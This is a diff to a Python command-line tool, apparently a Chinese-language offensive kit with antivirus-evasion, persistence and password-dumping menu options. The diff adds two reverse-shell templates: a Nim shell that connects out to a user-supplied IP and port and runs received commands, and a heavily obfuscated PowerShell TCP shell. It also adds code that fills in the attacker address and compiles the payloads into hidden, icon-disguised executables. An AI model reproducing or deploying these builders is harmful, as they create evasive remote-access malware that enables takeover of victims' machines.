@@ -55,6 +55,12 @@ Option_stub = """
  
  1.免杀加载器(Bypass Loader)
  2.文件格式转换(File Format Conversion)
+ 3.权限维持(Backdoor Persistence)
+ 4.远程反射dll(Invoke-ReflectivePEInjection)
+ 5.免杀套接字(Bypass Socket)
+ 6.密码抓取工具(Passwords Dumping Tools)
+ 7.shellcode加密解密(ShellCode EncryptionDecryptor)
+ 8.nim自动化宏嵌入(Nim Automation Macro Embedding)
 """
 stub = """
 import winim/clr
@@ -114,11 +120,48 @@ d88P     888  "Y88888  "Y888  "Y88P"  888  888  888 "Y888888  "Y888 888  "Y88P" 
 888         88888P'         888   "Y88P"      8888888888 888  888  "Y8888   "Y8888P                                                                                                                                                                                                                                                   
 """
 
-def main(powershell_to_vbs,PowerShell_stub, stub, raw_stub,verbose):
+nim_socket = """
+import net
+import osproc
+import os
+var ip = "IPREPLACE" 
+var port = PORTREPLACE
+var socket = newSocket()
+var finalcommand : string
+while true:
+    try:
+        socket.connect(ip,Port(port)) 
+        while true:            
+            try:
+                socket.send("<nimshell>")
+                var command = socket.recvLine() 
+                if command == "bye":
+                    socket.send("退出 NIM SHELL ")
+                    socket.close()
+                    system.quit(0)
+                if  system.hostOS == "windows":
+                    finalcommand = "cmd /C" & command
+                else:
+                    finalcommand = "/bin/sh -c" & command
+                var (cmdres, _) = execCmdEx(finalcommand)
+                socket.send(cmdres) 
+            except:
+                socket.close()
+                system.quit(0)
+    except:
+        echo "连接失败，5秒后尝试"
+        sleep(5000)
+        continue
+"""
+
+PowerShell_Socket = """
+Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("IPREPLACE",PORTREPLACE));
+&('sV')  ("{0}{1}" -f 'p','w4c')  (  [tYPE]("{1}{3}{2}{0}"-f 'nG','TE',("{1}{2}{0}" -f 'i','En','cOd'),'Xt.') ) ;&("{0}{2}{1}{3}" -f("{0}{1}" -f'Set','-'),'b',("{1}{0}"-f'aria','V'),'le') -Value (${C`L`IEnT}.("{1}{2}{0}" -f 'am',("{0}{1}" -f'G','etS'),'tre')."i`N`VoKe"()) -Name ("{0}{1}{2}" -f 's',("{0}{1}"-f'tr','ea'),'m');[byte[]]${b`Yt`es} = 0..65535|&('%'){0};while((.("{0}{2}{3}{1}" -f'S',("{0}{1}" -f'i','able'),'et',("{0}{1}" -f '-','Var')) -Name ('i') -Value (${s`T`Ream}.("{0}{1}"-f'Rea','d')."IN`Voke"(${b`Y`TES}, 0, ${By`Tes}."LeNg`TH"))) -ne 0){;&("{2}{0}{1}" -f'Va',("{0}{1}"-f 'ria','ble'),("{1}{0}"-f 't-','Se')) -Name ("{1}{0}"-f 'ta','da') -Value ((&("{2}{1}{0}" -f 'ect',("{0}{1}"-f'w-','Obj'),'Ne') -TypeName ("{4}{2}{1}{0}{5}{3}" -f'IEn','I',("{1}{0}{2}" -f'.','xt','ASC'),("{1}{0}"-f 'ding','o'),("{1}{2}{0}" -f'e','Sys','tem.T'),'c'))."g`e`TSTRiNg"(${bYT`Es},0, ${I}));.("{1}{2}{0}{3}"-f'i','Se',("{1}{0}"-f'r','t-Va'),("{1}{0}" -f 'ble','a')) -Value (.("{0}{1}"-f'ie','x') ${D`ATA} 2>&1 | .("{1}{2}{0}"-f'g','Ou',("{0}{1}"-f't-Stri','n')) ) -Name ("{0}{1}" -f ("{1}{2}{0}"-f 'c','se','ndba'),'k');.("{0}{3}{1}{2}" -f'Se',("{0}{1}"-f 'Va','riabl'),'e','t-') -Value (${sE`NDBack} + "PS " + (.("{0}{1}" -f'p','wd'))."P`ATH" + "> ") -Name ("{0}{1}"-f'se',("{0}{2}{1}"-f'n','ack2','db'));&("{1}{2}{3}{0}"-f 'le',("{0}{1}"-f 'Set-','Va'),'ri','ab') -Name ("{1}{0}"-f ("{0}{1}"-f'ndbyt','e'),'se') -Value (( (  .("{0}{1}" -f'i','tEm') ("{4}{2}{1}{0}{3}"-f'W4','Ble:p','IA','C','vaR')  )."vAL`UE"::"Asc`II").("{0}{1}" -f("{0}{1}"-f 'Get','By'),'tes')."in`VOKE"(${SEN`D`BAck2}));${str`eam}.("{0}{1}" -f'Wri','te')."InV`OKE"(${S`en`D`BYTE},0,${SeN`D`ByTe}."lE`NGtH");${ST`R`EaM}.("{0}{1}" -f ("{0}{1}"-f'F','lus'),'h')."IN`V`oKe"()};${cl`I`eNT}.("{0}{1}" -f'C',("{0}{1}"-f 'los','e'))."I`N`Voke"()
+"""
+
+def main(powershell_to_vbs,PowerShell_stub, stub, raw_stub,nim_socket,PowerShell_Socket,verbose):
     
     #print(stub)
-   
-
     while True:
         print(Option_stub)
         Options = input("<INOTGREEN>:")
@@ -191,7 +234,10 @@ def main(powershell_to_vbs,PowerShell_stub, stub, raw_stub,verbose):
         if Options == "2":
             while True:
                 print("1.ps1_to_vbs\n"
-                  "2.ps1_to_exe")
+                  "2.exe_vbs\n"
+                  "3.exe_hta\n"
+                  "4.exe_ps1\n"
+                  "5.ps1_to_exe")
                 formatopions = input("<INOTGREEN>:")
                 if formatopions == "1":
                     url = input("请输入网址：\n"
@@ -214,12 +260,12 @@ def main(powershell_to_vbs,PowerShell_stub, stub, raw_stub,verbose):
                     os.system("powershell .\Ps1ToVbs.ps1")
                     os.system("del Ps1ToVbs.ps1")
                     os.system("del stubps1tovbs.ps1")
-                if formatopions == "2":
+                if formatopions == "5":
                     Path = input("请输入文件路径:\n"
                     "<INOTEGREE>:")
                     Icon = input("请输入图标路径:\n"
                     "<INOTGREEN>:")
-                    os.system("powershell .\PSTOEXE.ps1 -inputFile '{}' -iconFile {} -outputFile 'Stub.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS".format(Path).format(Icon))
+                    os.system("powershell .\PSTOEXE.ps1 -inputFile '{0}' -iconFile {1} -outputFile 'Stub.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS".format(Path, Icon))
                 if formatopions == "back":
                     print(Option_stub)
                     break
@@ -232,21 +278,67 @@ def main(powershell_to_vbs,PowerShell_stub, stub, raw_stub,verbose):
             while True:
                 print("1.Powershell\n"
                 "2.C# Socket\n"
-                "5.Nim Lang\n"
+                "3.Nim Lang\n"
                 "4.python\n"
                 "5.C++\n")
                 socketchoice = input("请输入套接字选项\n"
                 "<INOTGREEN>:")
+                if socketchoice == "3":
+                    ip = input("请输入IP地址(域名)\n"
+                    "<INOTGREEN>:")
+                    port = input("请输入回连端口\n"
+                    "<INOTGREEN>:")
+                    nim_socket = nim_socket.replace("IPREPLACE",ip)
+                    nim_socket = nim_socket.replace("PORTREPLACE",port)
+
+                    Nim_Socket = open("Nim_Socket.nim","w")
+                    Nim_Socket.write(nim_socket)
+                    Nim_Socket.close()
+                    try:
+                        print("[+] 启用详细消息")
+                        sleep(1)
+                        print("[+] 将新存根保存到 Nim_Socket.nim")
+                        sleep(1)
+                        os.system("nim c --hints:off --warnings:off -d:danger -d:mingw --app:gui Nim_Socket.nim")
+                        os.system("del Nim_Socket.nim")
+                        break
+                    except:
+                        print("[!]编译失败")
+                        pass
+
                 if socketchoice == "1":
                     ip = input("请输入IP地址(域名)\n"
                     "<INOTGREEN>:")
                     port = input("请输入回连端口\n"
                     "<INOTGREEN>:")
+                    PowerShell_Socket = PowerShell_Socket.replace("IPREPLACE", ip)
+                    PowerShell_Socket = PowerShell_Socket.replace("PORTREPLACE", port)
+
+                    ps_stub = open("PowerShell_Socket.ps1","w")
+                    ps_stub.write(PowerShell_Socket)
+                    ps_stub.close()
+                    try:
+                        Icon = input("请输入图标路径:\n"
+                        "<INOTGREEN>:")
+                        print("[+] 启用详细消息")
+                        sleep(1)
+                        print("[+] 将新存根保存到 PowerShell_Socket.ps1")
+                        sleep(1)
+                        os.system(
+                                "powershell .\PSTOEXE.ps1 -inputFile 'PowerShell_Socket.ps1' -iconFile {} -outputFile 'Stub.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS".format(
+                                    Icon))
+                        os.system("del PowerShell_Socket.ps1")
+                    except:
+                        print("[!]编译失败")
+                        pass
+                #if socketchoice == "2"
+
+
         #if Options == "6": 
         else:
             sleep(1.9)
             print(Option_stub)
-main(powershell_to_vbs, PowerShell_stub, stub, raw_stub,verbose=True)
+main(powershell_to_vbs, PowerShell_stub, stub, raw_stub, nim_socket, PowerShell_Socket, verbose=True)
 
 
 
